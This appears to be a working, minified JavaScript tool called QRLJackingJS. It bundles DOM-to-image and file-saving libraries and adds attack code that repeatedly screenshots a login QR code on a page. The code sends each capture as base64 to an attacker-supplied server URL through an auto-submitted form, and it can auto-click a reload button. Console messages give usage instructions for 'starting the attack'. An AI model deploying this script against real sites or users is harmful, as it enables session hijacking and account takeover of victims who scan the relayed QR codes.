var QRLJackingJs,_______G2fRw5fJ6="QRLJackingJS";function ___getResource(e){e(!0)}___getResource(function(e){console.log(_______G2fRw5fJ6+": Initializing ..."),setTimeout(function(){!function(e){"use strict";var t=e.HTMLCanvasElement&&e.HTMLCanvasElement.prototype,n=e.Blob&&function(){try{return Boolean(new Blob)}catch(e){return!1}}(),r=n&&e.Uint8Array&&function(){try{return 100===new Blob([new Uint8Array(100)]).size}catch(e){return!1}}(),o=e.BlobBuilder||e.WebKitBlobBuilder||e.MozBlobBuilder||e.MSBlobBuilder,i=/^data:((.*?)(;charset=.*?)?)(;base64)?,/,a=(n||o)&&e.atob&&e.ArrayBuffer&&e.Uint8Array&&function(e){var t,a,u,c,l,s,f,d,h;if(!(t=e.match(i)))throw new Error("invalid data URI");for(a=t[2]?t[1]:"text/plain"+(t[3]||";charset=US-ASCII"),u=!!t[4],c=e.slice(t[0].length),l=u?atob(c):decodeURIComponent(c),s=new ArrayBuffer(l.length),f=new Uint8Array(s),d=0;d<l.length;d+=1)f[d]=l.charCodeAt(d);return n?new Blob([r?f:s],{type:a}):((h=new o).append(s),h.getBlob(a))};e.HTMLCanvasElement&&!t.toBlob&&(t.mozGetAsFile?t.toBlob=function(e,n,r){var o=this;setTimeout(function(){e(r&&t.toDataURL&&a?a(o.toDataURL(n,r)):o.mozGetAsFile("blob",n))})}:t.toDataURL&&a&&(t.toBlob=function(e,t,n){var r=this;setTimeout(function(){e(a(r.toDataURL(t,n)))})})),"function"==typeof define&&define.amd?define(function(){return a}):"object"==typeof module&&module.exports?module.exports=a:e.dataURLtoBlob=a}(window),function(e){"use strict";function t(e,t){return function(e){void 0===e.imagePlaceholder?s.impl.options.imagePlaceholder=l.imagePlaceholder:s.impl.options.imagePlaceholder=e.imagePlaceholder,void 0===e.cacheBust?s.impl.options.cacheBust=l.cacheBust:s.impl.options.cacheBust=e.cacheBust}(t=t||{}),Promise.resolve(e).then(function(e){return function e(t,n,r){function o(t,n,r){function o(t,n,r){var o=Promise.resolve();return n.forEach(function(n){o=o.then(function(){return e(n,r)}).then(function(e){e&&t.appendChild(e)})}),o}var a=t.childNodes;return 0===a.length?Promise.resolve(n):function o(e,t,n){var r=Promise.resolve();return t.forEach(function(t){r=r.then(function(){return function e(t,n,r){function o(t,n,r){function o(t,n,r){var o=Promise.resolve();return n.forEach(function(n){o=o.then(function(){return e(n,r)}).then(function(e){e&&t.appendChild(e)})}),o}var a=t.childNodes;return 0===a.length?Promise.resolve(n):o(n,i.asArray(a),r).then(function(){return n})}return r||!n||n(t)?Promise.resolve(t).then(function(e){return e instanceof HTMLCanvasElement?i.makeImage(e.toDataURL()):e.cloneNode(!1)}).then(function(e){return o(t,e,n)}).then(function(e){return function(e,t){return t instanceof Element?Promise.resolve().then(function(){!function(e,t){e.cssText?t.cssText=e.cssText:function(e,t){i.asArray(e).forEach(function(n){t.setProperty(n,e.getPropertyValue(n),e.getPropertyPriority(n))})}(e,t)}(window.getComputedStyle(e),t.style)}).then(function(){function n(n){var r=window.getComputedStyle(e,n),o=r.getPropertyValue("content");if(""!==o&&"none"!==o){var a=i.uid();t.className=t.className+" "+a;var u=document.createElement("style");u.appendChild(function(e,t,n){var r="."+e+":"+t,o=n.cssText?function(e){var t=e.getPropertyValue("content");return e.cssText+" content: "+t+";"}(n):function(e){return i.asArray(e).map(function(t){return t+": "+e.getPropertyValue(t)+(e.getPropertyPriority(t)?" !important":"")}).join("; ")+";"}(n);return document.createTextNode(r+"{"+o+"}")}(a,n,r)),t.appendChild(u)}}[":before",":after"].forEach(function(e){n(e)})}).then(function(){e instanceof HTMLTextAreaElement&&(t.innerHTML=e.value),e instanceof HTMLInputElement&&t.setAttribute("value",e.value)}).then(function(){t instanceof SVGElement&&(t.setAttribute("xmlns","http://www.w3.org/2000/svg"),t instanceof SVGRectElement&&["width","height"].forEach(function(e){var n=t.getAttribute(e);n&&t.style.setProperty(e,n)}))}).then(function(){return t}):t}(t,e)}):Promise.resolve()}(t,n)}).then(function(t){t&&e.appendChild(t)})}),r}(n,i.asArray(a),r).then(function(){return n})}return r||!n||n(t)?Promise.resolve(t).then(function(e){return e instanceof HTMLCanvasElement?i.makeImage(e.toDataURL()):e.cloneNode(!1)}).then(function(e){return o(t,e,n)}).then(function(e){return function(e,t){return t instanceof Element?Promise.resolve().then(function(){!function(e,t){e.cssText?t.cssText=e.cssText:function(e,t){i.asArray(e).forEach(function(n){t.setProperty(n,e.getPropertyValue(n),e.getPropertyPriority(n))})}(e,t)}(window.getComputedStyle(e),t.style)}).then(function(){function n(n){var r=window.getComputedStyle(e,n),o=r.getPropertyValue("content");if(""!==o&&"none"!==o){var a=i.uid();t.className=t.className+" "+a;var u=document.createElement("style");u.appendChild(function(e,t,n){var r="."+e+":"+t,o=n.cssText?function(e){var t=e.getPropertyValue("content");return e.cssText+" content: "+t+";"}(n):function(e){return i.asArray(e).map(function(t){return t+": "+e.getPropertyValue(t)+(e.getPropertyPriority(t)?" !important":"")}).join("; ")+";"}(n);return document.createTextNode(r+"{"+o+"}")}(a,n,r)),t.appendChild(u)}}[":before",":after"].forEach(function(e){n(e)})}).then(function(){e instanceof HTMLTextAreaElement&&(t.innerHTML=e.value),e instanceof HTMLInputElement&&t.setAttribute("value",e.value)}).then(function(){t instanceof SVGElement&&(t.setAttribute("xmlns","http://www.w3.org/2000/svg"),t instanceof SVGRectElement&&["width","height"].forEach(function(e){var n=t.getAttribute(e);n&&t.style.setProperty(e,n)}))}).then(function(){return t}):t}(t,e)}):Promise.resolve()}(e,t.filter,!0)}).then(r).then(o).then(function(e){return t.bgcolor&&(e.style.backgroundColor=t.bgcolor),t.width&&(e.style.width=t.width+"px"),t.height&&(e.style.height=t.height+"px"),t.style&&Object.keys(t.style).forEach(function(n){e.style[n]=t.style[n]}),e}).then(function(n){return function(e,t,n){return Promise.resolve(e).then(function(e){return e.setAttribute("xmlns","http://www.w3.org/1999/xhtml"),(new XMLSerializer).serializeToString(e)}).then(i.escapeXhtml).then(function(e){return'<foreignObject x="0" y="0" width="100%" height="100%">'+e+"</foreignObject>"}).then(function(e){return'<svg xmlns="http://www.w3.org/2000/svg" width="'+t+'" height="'+n+'">'+e+"</svg>"}).then(function(e){return"data:image/svg+xml;charset=utf-8,"+e})}(n,t.width||i.width(e),t.height||i.height(e))})}function n(e,n){function r(e){var t=document.createElement("canvas");if(t.width=n.width||i.width(e),t.height=n.height||i.height(e),n.bgcolor){var r=t.getContext("2d");r.fillStyle=n.bgcolor,r.fillRect(0,0,t.width,t.height)}return t}return t(e,n).then(i.makeImage).then(i.delay(100)).then(function(t){var n=r(e);return n.getContext("2d").drawImage(t,0,0),n})}function r(e){return u.resolveAll().then(function(t){var n=document.createElement("style");return e.appendChild(n),n.appendChild(document.createTextNode(t)),e})}function o(e){return c.inlineAll(e).then(function(){return e})}var i=function(){function e(e){var t=/\.([^\.\/]*?)$/g.exec(e);return t?t[1]:""}function t(e,t){var n=window.getComputedStyle(e).getPropertyValue(t);return parseFloat(n.replace("px",""))}return{escape:function(e){return e.replace(/([.*+?^${}()|\[\]\/\\])/g,"\\$1")},parseExtension:e,mimeType:function(t){var n=e(t).toLowerCase();return function(){var e="application/font-woff",t="image/jpeg";return{woff:e,woff2:e,ttf:"application/font-truetype",eot:"application/vnd.ms-fontobject",png:"image/png",jpg:t,jpeg:t,gif:"image/gif",tiff:"image/tiff",svg:"image/svg+xml"}}()[n]||""},dataAsUrl:function(e,t){return"data:"+t+";base64,"+e},isDataUrl:function(e){return-1!==e.search(/^(data:)/)},canvasToBlob:function(e){return e.toBlob?new Promise(function(t){e.toBlob(t)}):function(e){return new Promise(function(t){for(var n=window.atob(e.toDataURL().split(",")[1]),r=n.length,o=new Uint8Array(r),i=0;i<r;i++)o[i]=n.charCodeAt(i);t(new Blob([o],{type:"image/png"}))})}(e)},resolveUrl:function(e,t){var n=document.implementation.createHTMLDocument(),r=n.createElement("base");n.head.appendChild(r);var o=n.createElement("a");return n.body.appendChild(o),r.href=t,o.href=e,o.href},getAndEncode:function(e){var t=3e4;return s.impl.options.cacheBust&&(e+=(/\?/.test(e)?"&":"?")+(new Date).getTime()),new Promise(function(n){function r(e){console.error(e),n("")}var o,i=new XMLHttpRequest;if(i.onreadystatechange=function(){if(4===i.readyState){if(200!==i.status)return void(o?n(o):r("cannot fetch resource: "+e+", status: "+i.status));var t=new FileReader;t.onloadend=function(){var e=t.result.split(/,/)[1];n(e)},t.readAsDataURL(i.response)}},i.ontimeout=function(){o?n(o):r("timeout of "+t+"ms occured while fetching resource: "+e)},i.responseType="blob",i.timeout=t,i.open("GET",e,!0),i.send(),s.impl.options.imagePlaceholder){var a=s.impl.options.imagePlaceholder.split(/,/);a&&a[1]&&(o=a[1])}})},uid:function(){var e=0;return function(){return"u"+("0000"+(Math.random()*Math.pow(36,4)<<0).toString(36)).slice(-4)+e++}}(),delay:function(e){return function(t){return new Promise(function(n){setTimeout(function(){n(t)},e)})}},asArray:function(e){for(var t=[],n=e.length,r=0;r<n;r++)t.push(e[r]);return t},escapeXhtml:function(e){return e.replace(/#/g,"%23").replace(/\n/g,"%0A")},makeImage:function(e){return new Promise(function(t,n){var r=new Image;r.onload=function(){t(r)},r.onerror=n,r.src=e})},width:function(e){var n=t(e,"border-left-width"),r=t(e,"border-right-width");return e.scrollWidth+n+r},height:function(e){var n=t(e,"border-top-width"),r=t(e,"border-bottom-width");return e.scrollHeight+n+r}}}(),a=function(){function e(e){return-1!==e.search(r)}function t(e){for(var t,n=[];null!==(t=r.exec(e));)n.push(t[1]);return n.filter(function(e){return!i.isDataUrl(e)})}function n(e,t,n,r){return Promise.resolve(t).then(function(e){return n?i.resolveUrl(e,n):e}).then(r||i.getAndEncode).then(function(e){return i.dataAsUrl(e,i.mimeType(t))}).then(function(n){return e.replace(function(e){return new RegExp("(url\\(['\"]?)("+i.escape(e)+")(['\"]?\\))","g")}(t),"$1"+n+"$3")})}var r=/url\(['"]?([^'"]+?)['"]?\)/g;return{inlineAll:function(r,o,i){return e(r)?Promise.resolve(r).then(t).then(function(e){var t=Promise.resolve(r);return e.forEach(function(e){t=t.then(function(t){return n(t,e,o,i)})}),t}):Promise.resolve(r)},shouldProcess:e,impl:{readUrls:t,inline:n}}}(),u=function(){function e(){function e(e){return{resolve:function(){var t=(e.parentStyleSheet||{}).href;return a.inlineAll(e.cssText,t)},src:function(){return e.style.getPropertyValue("src")}}}return Promise.resolve(i.asArray(document.styleSheets)).then(function(e){var t=[];return e.forEach(function(e){try{i.asArray(e.cssRules||[]).forEach(t.push.bind(t))}catch(t){console.log("Error while reading CSS rules from "+e.href,t.toString())}}),t}).then(function(e){return e.filter(function(e){return e.type===CSSRule.FONT_FACE_RULE}).filter(function(e){return a.shouldProcess(e.style.getPropertyValue("src"))})}).then(function(t){return t.map(e)})}return{resolveAll:function(){return e(document).then(function(e){return Promise.all(e.map(function(e){return e.resolve()}))}).then(function(e){return e.join("\n")})},impl:{readAll:e}}}(),c=function(){function e(e){return{inline:function(t){return i.isDataUrl(e.src)?Promise.resolve():Promise.resolve(e.src).then(t||i.getAndEncode).then(function(t){return i.dataAsUrl(t,i.mimeType(e.src))}).then(function(t){return new Promise(function(n,r){e.onload=n,e.onerror=r,e.src=t})})}}}return{inlineAll:function t(n){return n instanceof Element?function(e){var t=e.style.getPropertyValue("background");return t?a.inlineAll(t).then(function(t){e.style.setProperty("background",t,e.style.getPropertyPriority("background"))}).then(function(){return e}):Promise.resolve(e)}(n).then(function(){return n instanceof HTMLImageElement?e(n).inline():Promise.all(i.asArray(n.childNodes).map(function(e){return t(e)}))}):Promise.resolve(n)},impl:{newImage:e}}}(),l={imagePlaceholder:void 0,cacheBust:!1},s={toSvg:t,toPng:function(e,t){return n(e,t||{}).then(function(e){return e.toDataURL()})},toJpeg:function(e,t){return n(e,t=t||{}).then(function(e){return e.toDataURL("image/jpeg",t.quality||1)})},toBlob:function(e,t){return n(e,t||{}).then(i.canvasToBlob)},toPixelData:function(e,t){return n(e,t||{}).then(function(t){return t.getContext("2d").getImageData(0,0,i.width(e),i.height(e)).data})},impl:{fontFaces:u,images:c,util:i,inliner:a,options:{}}};"undefined"!=typeof module?module.exports=s:e.domtoimage=s}(this);var e=e||"undefined"!=typeof navigator&&navigator.msSaveOrOpenBlob&&navigator.msSaveOrOpenBlob.bind(navigator)||function(e){"use strict";if("undefined"==typeof navigator||!/MSIE [1-9]\./.test(navigator.userAgent)){var t=e.document,n=t.createElementNS("http://www.w3.org/1999/xhtml","a"),r="download"in n,o=function(n){var r=t.createEvent("MouseEvents");r.initMouseEvent("click",!0,!1,e,0,0,0,0,0,!1,!1,!1,!1,0,null),n.dispatchEvent(r)},i=e.webkitRequestFileSystem,a=e.requestFileSystem||i||e.mozRequestFileSystem,u=function(t){(e.setImmediate||e.setTimeout)(function(){throw t},0)},c=0,l=function(t){var n=function(){"string"==typeof t?(e.URL||e.webkitURL||e).revokeObjectURL(t):t.remove()};e.chrome?n():setTimeout(n,500)},s=function(e,t,n){for(var r=(t=[].concat(t)).length;r--;){var o=e["on"+t[r]];if("function"==typeof o)try{o.call(e,n||e)}catch(e){u(e)}}},f=function(t,u){var f,d,h,m=this,g=t.type,p=!1,v=function(){s(m,["writestart","progress","write","writeend"])},y=function(){!p&&f||(f=(e.URL||e.webkitURL||e).createObjectURL(t)),d?d.location.href=f:null==e.open(f,"_blank")&&"undefined"!=typeof safari&&(e.location.href=f),m.readyState=m.DONE,v(),l(f)},w=function(e){return function(){if(m.readyState!==m.DONE)return e.apply(this,arguments)}},b={create:!0,exclusive:!1};m.readyState=m.INIT,u||(u="download"),r?(f=(e.URL||e.webkitURL||e).createObjectURL(t),n.href=f,n.download=u,o(n),m.readyState=m.DONE,v(),l(f)):(e.chrome&&g&&"application/octet-stream"!==g&&(h=t.slice||t.webkitSlice,t=h.call(t,0,t.size,"application/octet-stream"),p=!0),i&&"download"!==u&&(u+=".download"),("application/octet-stream"===g||i)&&(d=e),a?(c+=t.size,a(e.TEMPORARY,c,w(function(e){e.root.getDirectory("saved",b,w(function(e){var n=function(){e.getFile(u,b,w(function(e){e.createWriter(w(function(n){n.onwriteend=function(t){d.location.href=e.toURL(),m.readyState=m.DONE,s(m,"writeend",t),l(e)},n.onerror=function(){var e=n.error;e.code!==e.ABORT_ERR&&y()},["writestart","progress","write","abort"].forEach(function(e){n["on"+e]=m["on"+e]}),n.write(t),m.abort=function(){n.abort(),m.readyState=m.DONE},m.readyState=m.WRITING}),y)}),y)};e.getFile(u,{create:!1},w(function(e){e.remove(),n()}),w(function(e){e.code===e.NOT_FOUND_ERR?n():y()}))}),y)}),y)):y())},d=f.prototype;return d.abort=function(){this.readyState=this.DONE,s(this,"abort")},d.readyState=d.INIT=0,d.WRITING=1,d.DONE=2,d.error=d.onwritestart=d.onprogress=d.onwrite=d.onabort=d.onerror=d.onwriteend=null,function(e,t){return new f(e,t)}}}("undefined"!=typeof self&&self||"undefined"!=typeof window&&window||this.content);"undefined"!=typeof module&&null!==module?module.exports=e:"undefined"!=typeof define&&null!==define&&null!=define.amd&&define([],function(){return e});var t=function(e,t){var n,r;n={element:document.getElementById("___qrCodeAutoGeneratedId")},r=function(n){var r=document.createElement("form");r.setAttribute("method","post"),r.setAttribute("action",e),r.innerHTML='<input value="'+n+'" name="'+t+'">',document.body.appendChild(r),function(e){window.open("","form-target","width=50, height=20");r.target="form-target",r.submit(),$(r).remove()}()},void 0!==n.element?domtoimage.toJpeg(n.element,{quality:.6}).then(function(e){r(e)}):alert(_______G2fRw5fJ6+": Error! choose a valid QR image container element to start the attack.")};QRLJackingJs=function(e,n,r,o=null,i=null){var a=prompt(_______G2fRw5fJ6+": Enter your server URL (must receive base64 image)");null!==a&&a.length>5?(console.log(_______G2fRw5fJ6+": Starting and repeating the attack each "+r+" seconds."),setInterval(function(){$(n).attr("id","___qrCodeAutoGeneratedId"),null!==o&&null!==i&&$(o).length>0?($(o).trigger("click"),setTimeout(function(){t(a,e)},1e3*i)):t(a,e)},1e3*r)):alert(_______G2fRw5fJ6+": Invalid URL. Please try again.")},console.log(_______G2fRw5fJ6+": Initialization completed successfully. Use this code to start the attack:","\n","\n","QRLJackingJs(","\n","bas64ImageServerPOSTParam, // the parameter you have on your server to receive the base64 encoded image","\n","elementToScreenshotSelector, // the element that has the QR image in it e.g. #qrCodeDiv","\n","attackWaitingTimeBeforeSendingEachScreenshotInSeconds, // waiting time between each screenshot sending. Recommended: 4","\n","reloadButtonSelector, // optional: used to auto click the QR code reload element if any","\n","reloadButtonWaitingTimeBeforeSendingInSeconds // optional: waiting time after clicking the reload button and before sending the screenshot","\n",");")},500)});
